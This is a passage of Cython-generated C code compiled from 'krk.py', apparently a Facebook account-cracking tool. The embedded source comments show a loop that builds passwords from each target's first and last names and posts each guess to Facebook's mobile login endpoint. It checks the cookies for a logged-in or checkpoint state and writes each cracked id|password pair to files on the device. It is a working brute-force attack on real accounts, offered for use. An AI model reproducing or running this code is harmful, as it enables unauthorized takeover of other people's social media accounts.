        __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_keys); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 363, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = NULL;
        __pyx_t_7 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
          __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_3);
          if (likely(__pyx_t_1)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
            __Pyx_INCREF(__pyx_t_1);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_3, function);
            __pyx_t_7 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[1] = {__pyx_t_1, };
          __pyx_t_16 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 363, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_16);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        }
        __Pyx_XDECREF_SET(__pyx_v_Sabir, __pyx_t_16);
        __pyx_t_16 = 0;

        /* "krk.py":364
 *                         complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
 *                         Sabir=session.cookies.get_dict().keys()
 *                         if "c_user" in Sabir:             # <<<<<<<<<<<<<<
 *                                 print('\r\r\033[1;32m [ZEA-OK] %s | %s'%(ids,pas))
 *                                 open('/sdcard/ZEA-OK.txt', 'a').write(ids+'|'+pas+'\n')
 */
        __pyx_t_19 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_c_user, __pyx_v_Sabir, Py_EQ)); if (unlikely((__pyx_t_19 < 0))) __PYX_ERR(0, 364, __pyx_L3_error)
        if (__pyx_t_19) {

          /* "krk.py":365
 *                         Sabir=session.cookies.get_dict().keys()
 *                         if "c_user" in Sabir:
 *                                 print('\r\r\033[1;32m [ZEA-OK] %s | %s'%(ids,pas))             # <<<<<<<<<<<<<<
 *                                 open('/sdcard/ZEA-OK.txt', 'a').write(ids+'|'+pas+'\n')
 *                                 oks.append(ids)
 */
          __pyx_t_16 = PyTuple_New(2); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 365, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_16);
          __Pyx_INCREF(__pyx_v_ids);
          __Pyx_GIVEREF(__pyx_v_ids);
          PyTuple_SET_ITEM(__pyx_t_16, 0, __pyx_v_ids);
          __Pyx_INCREF(__pyx_v_pas);
          __Pyx_GIVEREF(__pyx_v_pas);
          PyTuple_SET_ITEM(__pyx_t_16, 1, __pyx_v_pas);
          __pyx_t_3 = __Pyx_PyString_Format(__pyx_kp_s_1_32m_ZEA_OK_s_s, __pyx_t_16); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 365, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
          __pyx_t_16 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_3); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 365, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_16);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;

          /* "krk.py":366
 *                         if "c_user" in Sabir:
 *                                 print('\r\r\033[1;32m [ZEA-OK] %s | %s'%(ids,pas))
 *                                 open('/sdcard/ZEA-OK.txt', 'a').write(ids+'|'+pas+'\n')             # <<<<<<<<<<<<<<
 *                                 oks.append(ids)
 *                                 break
 */
          __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__67, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 366, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_write); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 366, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __pyx_t_3 = PyNumber_Add(__pyx_v_ids, __pyx_kp_s__25); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 366, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_4 = PyNumber_Add(__pyx_t_3, __pyx_v_pas); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 366, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __pyx_t_3 = PyNumber_Add(__pyx_t_4, __pyx_kp_s__63); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 366, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_t_4 = NULL;
          __pyx_t_7 = 0;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
            __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_1);
            if (likely(__pyx_t_4)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
              __Pyx_INCREF(__pyx_t_4);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_1, function);
              __pyx_t_7 = 1;
            }
          }
          {
            PyObject *__pyx_callargs[2] = {__pyx_t_4, __pyx_t_3};
            __pyx_t_16 = __Pyx_PyObject_FastCall(__pyx_t_1, __pyx_callargs+1-__pyx_t_7, 1+__pyx_t_7);
            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 366, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_16);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          }
          __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;

          /* "krk.py":367
 *                                 print('\r\r\033[1;32m [ZEA-OK] %s | %s'%(ids,pas))
 *                                 open('/sdcard/ZEA-OK.txt', 'a').write(ids+'|'+pas+'\n')
 *                                 oks.append(ids)             # <<<<<<<<<<<<<<
 *                                 break
 *                         elif 'checkpoint' in Sabir:
 */
          __Pyx_GetModuleGlobalName(__pyx_t_16, __pyx_n_s_oks); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 367, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_16);
          __pyx_t_20 = __Pyx_PyObject_Append(__pyx_t_16, __pyx_v_ids); if (unlikely(__pyx_t_20 == ((int)-1))) __PYX_ERR(0, 367, __pyx_L3_error)
          __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;

          /* "krk.py":368
 *                                 open('/sdcard/ZEA-OK.txt', 'a').write(ids+'|'+pas+'\n')
 *                                 oks.append(ids)
 *                                 break             # <<<<<<<<<<<<<<
 *                         elif 'checkpoint' in Sabir:
 *                                 if 'y' in pcp:
 */
          goto __pyx_L18_break;

          /* "krk.py":364
 *                         complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
 *                         Sabir=session.cookies.get_dict().keys()
 *                         if "c_user" in Sabir:             # <<<<<<<<<<<<<<
 *                                 print('\r\r\033[1;32m [ZEA-OK] %s | %s'%(ids,pas))
 *                                 open('/sdcard/ZEA-OK.txt', 'a').write(ids+'|'+pas+'\n')
 */
        }

        /* "krk.py":369
 *                                 oks.append(ids)
 *                                 break
 *                         elif 'checkpoint' in Sabir:             # <<<<<<<<<<<<<<
 *                                 if 'y' in pcp:
 *                                         print('\r\r\x1b[1;36m [ZEA-CP] '+ids+' | '+pas+'\033[1;97m')
 */
        __pyx_t_19 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_checkpoint, __pyx_v_Sabir, Py_EQ)); if (unlikely((__pyx_t_19 < 0))) __PYX_ERR(0, 369, __pyx_L3_error)
        if (__pyx_t_19) {

          /* "krk.py":370
 *                                 break
 *                         elif 'checkpoint' in Sabir:
 *                                 if 'y' in pcp:             # <<<<<<<<<<<<<<
 *                                         print('\r\r\x1b[1;36m [ZEA-CP] '+ids+' | '+pas+'\033[1;97m')
 *                                         open('/sdcard/ZEA-CP.txt', 'a').write(ids+'|'+pas+'\n')
 */
          __Pyx_GetModuleGlobalName(__pyx_t_16, __pyx_n_s_pcp); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 370, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_16);
          __pyx_t_19 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_y, __pyx_t_16, Py_EQ)); if (unlikely((__pyx_t_19 < 0))) __PYX_ERR(0, 370, __pyx_L3_error)
          __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
          if (__pyx_t_19) {

            /* "krk.py":371
 *                         elif 'checkpoint' in Sabir:
 *                                 if 'y' in pcp:
 *                                         print('\r\r\x1b[1;36m [ZEA-CP] '+ids+' | '+pas+'\033[1;97m')             # <<<<<<<<<<<<<<
 *                                         open('/sdcard/ZEA-CP.txt', 'a').write(ids+'|'+pas+'\n')
 *                                         cps.append(ids)
 */
            __pyx_t_16 = PyNumber_Add(__pyx_kp_s_1_36m_ZEA_CP, __pyx_v_ids); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 371, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_16);
            __pyx_t_1 = PyNumber_Add(__pyx_t_16, __pyx_kp_s__68); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 371, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
            __pyx_t_16 = PyNumber_Add(__pyx_t_1, __pyx_v_pas); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 371, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_16);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __pyx_t_1 = PyNumber_Add(__pyx_t_16, __pyx_kp_s_1_97m); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 371, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
            __pyx_t_16 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_1); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 371, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_16);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;

            /* "krk.py":372
 *                                 if 'y' in pcp:
 *                                         print('\r\r\x1b[1;36m [ZEA-CP] '+ids+' | '+pas+'\033[1;97m')
 *                                         open('/sdcard/ZEA-CP.txt', 'a').write(ids+'|'+pas+'\n')             # <<<<<<<<<<<<<<
 *                                         cps.append(ids)
 *                                         break
 */
            __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__69, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 372, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_1);
            __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_write); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 372, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __pyx_t_1 = PyNumber_Add(__pyx_v_ids, __pyx_kp_s__25); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 372, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_1);
            __pyx_t_4 = PyNumber_Add(__pyx_t_1, __pyx_v_pas); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 372, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __pyx_t_1 = PyNumber_Add(__pyx_t_4, __pyx_kp_s__63); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 372, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_t_4 = NULL;
            __pyx_t_7 = 0;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
              __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
              if (likely(__pyx_t_4)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
                __Pyx_INCREF(__pyx_t_4);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_3, function);
                __pyx_t_7 = 1;
              }
            }
            {
              PyObject *__pyx_callargs[2] = {__pyx_t_4, __pyx_t_1};
              __pyx_t_16 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_7, 1+__pyx_t_7);
              __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
              __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
              if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 372, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_16);
              __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            }
            __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;

            /* "krk.py":373
 *                                         print('\r\r\x1b[1;36m [ZEA-CP] '+ids+' | '+pas+'\033[1;97m')
 *                                         open('/sdcard/ZEA-CP.txt', 'a').write(ids+'|'+pas+'\n')
 *                                         cps.append(ids)             # <<<<<<<<<<<<<<
 *                                         break
 *                                 else:
 */
            __Pyx_GetModuleGlobalName(__pyx_t_16, __pyx_n_s_cps); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 373, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_16);
            __pyx_t_20 = __Pyx_PyObject_Append(__pyx_t_16, __pyx_v_ids); if (unlikely(__pyx_t_20 == ((int)-1))) __PYX_ERR(0, 373, __pyx_L3_error)
            __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;

            /* "krk.py":374
 *                                         open('/sdcard/ZEA-CP.txt', 'a').write(ids+'|'+pas+'\n')
 *                                         cps.append(ids)
 *                                         break             # <<<<<<<<<<<<<<
 *                                 else:
 *                                         break
 */
            goto __pyx_L18_break;

            /* "krk.py":370
 *                                 break
 *                         elif 'checkpoint' in Sabir:
 *                                 if 'y' in pcp:             # <<<<<<<<<<<<<<
 *                                         print('\r\r\x1b[1;36m [ZEA-CP] '+ids+' | '+pas+'\033[1;97m')
 *                                         open('/sdcard/ZEA-CP.txt', 'a').write(ids+'|'+pas+'\n')
 */
          }

          /* "krk.py":376
 *                                         break
 *                                 else:
 *                                         break             # <<<<<<<<<<<<<<
 *                         else:
 *                                 continue
 */
          /*else*/ {
            goto __pyx_L18_break;
          }

          /* "krk.py":369
 *                                 oks.append(ids)
 *                                 break
 *                         elif 'checkpoint' in Sabir:             # <<<<<<<<<<<<<<
 *                                 if 'y' in pcp:
 *                                         print('\r\r\x1b[1;36m [ZEA-CP] '+ids+' | '+pas+'\033[1;97m')
 */
        }

        /* "krk.py":378
 *                                         break
 *                         else:
 *                                 continue             # <<<<<<<<<<<<<<
 *         except requests.exceptions.ConnectionError:
 *                 time.sleep(20)
 */
        /*else*/ {
          goto __pyx_L17_continue;
        }

        /* "krk.py":356
 *                 ps = first.lower()
 *                 ps2 = last.lower()
 *                 for fikr in passlist:             # <<<<<<<<<<<<<<
 *                         pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
 *                         ua=random.choice(ugen)
 */
        __pyx_L17_continue:;
      }
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      goto __pyx_L21_for_end;
      __pyx_L18_break:;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      goto __pyx_L21_for_end;
      __pyx_L21_for_end:;

      /* "krk.py":348
 *         sys.stdout.write('\r\r\033[1;37m [ZEA-XD-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 *         session = requests.Session()
 *         try:             # <<<<<<<<<<<<<<
 *                 first = names.split(' ')[0]
 *                 try:
 */
    }
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
    __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;

    /* "krk.py":379
 *                         else:
 *                                 continue
 *         except requests.exceptions.ConnectionError:             # <<<<<<<<<<<<<<
 *                 time.sleep(20)
 *         loop+=1
 */
    __Pyx_ErrFetch(&__pyx_t_2, &__pyx_t_16, &__pyx_t_3);
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_requests); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 379, __pyx_L5_except_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_exceptions); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 379, __pyx_L5_except_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_ConnectionError); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 379, __pyx_L5_except_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_7 = __Pyx_PyErr_GivenExceptionMatches(__pyx_t_2, __pyx_t_1);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_ErrRestore(__pyx_t_2, __pyx_t_16, __pyx_t_3);
    __pyx_t_2 = 0; __pyx_t_16 = 0; __pyx_t_3 = 0;
    if (__pyx_t_7) {
      __Pyx_AddTraceback("krk.ffb", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_3, &__pyx_t_16, &__pyx_t_2) < 0) __PYX_ERR(0, 379, __pyx_L5_except_error)
      __Pyx_XGOTREF(__pyx_t_3);
      __Pyx_XGOTREF(__pyx_t_16);
      __Pyx_XGOTREF(__pyx_t_2);

      /* "krk.py":380
 *                                 continue
 *         except requests.exceptions.ConnectionError:
 *                 time.sleep(20)             # <<<<<<<<<<<<<<
 *         loop+=1
 * def api(ids,names,passlist):
 */
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_time); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 380, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_15 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_sleep); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 380, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_15);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = NULL;
      __pyx_t_7 = 0;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_15))) {
        __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_15);
        if (likely(__pyx_t_4)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_15);
          __Pyx_INCREF(__pyx_t_4);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_15, function);
          __pyx_t_7 = 1;
        }
      }
      {
        PyObject *__pyx_callargs[2] = {__pyx_t_4, __pyx_int_20};
        __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_15, __pyx_callargs+1-__pyx_t_7, 1+__pyx_t_7);
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 380, __pyx_L5_except_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
      }
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;

    /* "krk.py":348
 *         sys.stdout.write('\r\r\033[1;37m [ZEA-XD-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 *         session = requests.Session()
 *         try:             # <<<<<<<<<<<<<<
 *                 first = names.split(' ')[0]
 *                 try:
 */
    __pyx_L5_except_error:;
    __Pyx_XGIVEREF(__pyx_t_8);
    __Pyx_XGIVEREF(__pyx_t_9);
    __Pyx_XGIVEREF(__pyx_t_10);
    __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_9, __pyx_t_10);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_8);
    __Pyx_XGIVEREF(__pyx_t_9);
    __Pyx_XGIVEREF(__pyx_t_10);
    __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_9, __pyx_t_10);
    __pyx_L8_try_end:;
  }

  /* "krk.py":381
 *         except requests.exceptions.ConnectionError:
 *                 time.sleep(20)
 *         loop+=1             # <<<<<<<<<<<<<<
 * def api(ids,names,passlist):
 *         try:
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_loop); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 381, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_16 = __Pyx_PyInt_AddObjC(__pyx_t_2, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 381, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_16);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_loop, __pyx_t_16) < 0) __PYX_ERR(0, 381, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;

  /* "krk.py":344
 *                 input(' Press enter to back ')
 *                 os.system('python ZEA')
 * def ffb(ids,names,passlist):             # <<<<<<<<<<<<<<
 *         global loop,oks,cps
 *         sys.stdout.write('\r\r\033[1;37m [ZEA-XD-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_15);
  __Pyx_XDECREF(__pyx_t_16);
  __Pyx_AddTraceback("krk.ffb", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_session);
  __Pyx_XDECREF(__pyx_v_first);
  __Pyx_XDECREF(__pyx_v_last);
  __Pyx_XDECREF(__pyx_v_ps);
  __Pyx_XDECREF(__pyx_v_ps2);
  __Pyx_XDECREF(__pyx_v_fikr);
  __Pyx_XDECREF(__pyx_v_pas);
  __Pyx_XDECREF(__pyx_v_ua);
  __Pyx_XDECREF(__pyx_v_head);
  __Pyx_XDECREF(__pyx_v_getlog);
  __Pyx_XDECREF(__pyx_v_idpass);
  __Pyx_XDECREF(__pyx_v_complete);
  __Pyx_XDECREF(__pyx_v_Sabir);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "krk.py":382
 *                 time.sleep(20)
 *         loop+=1
 * def api(ids,names,passlist):             # <<<<<<<<<<<<<<
 *         try:
 *                 global ok,loop,sim_id
 */

/* Python wrapper */
static PyObject *__pyx_pw_3krk_15api(PyObject *__pyx_self, 
#if CYTHON_METH_FASTCALL
PyObject *const *__pyx_args, Py_ssize_t __pyx_nargs, PyObject *__pyx_kwds
#else
PyObject *__pyx_args, PyObject *__pyx_kwds
#endif
); /*proto*/
static PyMethodDef __pyx_mdef_3krk_15api = {"api", (PyCFunction)(void*)(__Pyx_PyCFunction_FastCallWithKeywords)__pyx_pw_3krk_15api, __Pyx_METH_FASTCALL|METH_KEYWORDS, 0};
static PyObject *__pyx_pw_3krk_15api(PyObject *__pyx_self, 
#if CYTHON_METH_FASTCALL
PyObject *const *__pyx_args, Py_ssize_t __pyx_nargs, PyObject *__pyx_kwds
#else
PyObject *__pyx_args, PyObject *__pyx_kwds
#endif
) {
  PyObject *__pyx_v_ids = 0;
  PyObject *__pyx_v_names = 0;
  PyObject *__pyx_v_passlist = 0;
  #if !CYTHON_METH_FASTCALL
  CYTHON_UNUSED const Py_ssize_t __pyx_nargs = PyTuple_GET_SIZE(__pyx_args);
  #endif
  CYTHON_UNUSED PyObject *const *__pyx_kwvalues = __Pyx_KwValues_FASTCALL(__pyx_args, __pyx_nargs);
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("api (wrapper)", 0);
  {
    PyObject **__pyx_pyargnames[] = {&__pyx_n_s_ids,&__pyx_n_s_names,&__pyx_n_s_passlist,0};
    PyObject* values[3] = {0,0,0};
    if (__pyx_kwds) {
      Py_ssize_t kw_args;
      switch (__pyx_nargs) {
        case  3: values[2] = __Pyx_Arg_FASTCALL(__pyx_args, 2);
        CYTHON_FALLTHROUGH;
        case  2: values[1] = __Pyx_Arg_FASTCALL(__pyx_args, 1);
        CYTHON_FALLTHROUGH;
        case  1: values[0] = __Pyx_Arg_FASTCALL(__pyx_args, 0);
        CYTHON_FALLTHROUGH;
        case  0: break;
        default: goto __pyx_L5_argtuple_error;
      }
      kw_args = __Pyx_NumKwargs_FASTCALL(__pyx_kwds);
      switch (__pyx_nargs) {
        case  0:
        if (likely((values[0] = __Pyx_GetKwValue_FASTCALL(__pyx_kwds, __pyx_kwvalues, __pyx_n_s_ids)) != 0)) kw_args--;
        else if (unlikely(PyErr_Occurred())) __PYX_ERR(0, 382, __pyx_L3_error)
        else goto __pyx_L5_argtuple_error;
        CYTHON_FALLTHROUGH;
        case  1:
        if (likely((values[1] = __Pyx_GetKwValue_FASTCALL(__pyx_kwds, __pyx_kwvalues, __pyx_n_s_names)) != 0)) kw_args--;
        else if (unlikely(PyErr_Occurred())) __PYX_ERR(0, 382, __pyx_L3_error)
        else {
          __Pyx_RaiseArgtupleInvalid("api", 1, 3, 3, 1); __PYX_ERR(0, 382, __pyx_L3_error)
        }
        CYTHON_FALLTHROUGH;
        case  2:
        if (likely((values[2] = __Pyx_GetKwValue_FASTCALL(__pyx_kwds, __pyx_kwvalues, __pyx_n_s_passlist)) != 0)) kw_args--;
        else if (unlikely(PyErr_Occurred())) __PYX_ERR(0, 382, __pyx_L3_error)
        else {
          __Pyx_RaiseArgtupleInvalid("api", 1, 3, 3, 2); __PYX_ERR(0, 382, __pyx_L3_error)
        }
      }
      if (unlikely(kw_args > 0)) {
        const Py_ssize_t kwd_pos_args = __pyx_nargs;
        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_kwvalues, __pyx_pyargnames, 0, values + 0, kwd_pos_args, "api") < 0)) __PYX_ERR(0, 382, __pyx_L3_error)
      }
    } else if (unlikely(__pyx_nargs != 3)) {
      goto __pyx_L5_argtuple_error;
    } else {
      values[0] = __Pyx_Arg_FASTCALL(__pyx_args, 0);
      values[1] = __Pyx_Arg_FASTCALL(__pyx_args, 1);
      values[2] = __Pyx_Arg_FASTCALL(__pyx_args, 2);
    }
    __pyx_v_ids = values[0];
    __pyx_v_names = values[1];
    __pyx_v_passlist = values[2];
  }
  goto __pyx_L4_argument_unpacking_done;
  __pyx_L5_argtuple_error:;
  __Pyx_RaiseArgtupleInvalid("api", 1, 3, 3, __pyx_nargs); __PYX_ERR(0, 382, __pyx_L3_error)
  __pyx_L3_error:;
  __Pyx_AddTraceback("krk.api", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __Pyx_RefNannyFinishContext();
  return NULL;
  __pyx_L4_argument_unpacking_done:;
  __pyx_r = __pyx_pf_3krk_14api(__pyx_self, __pyx_v_ids, __pyx_v_names, __pyx_v_passlist);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}
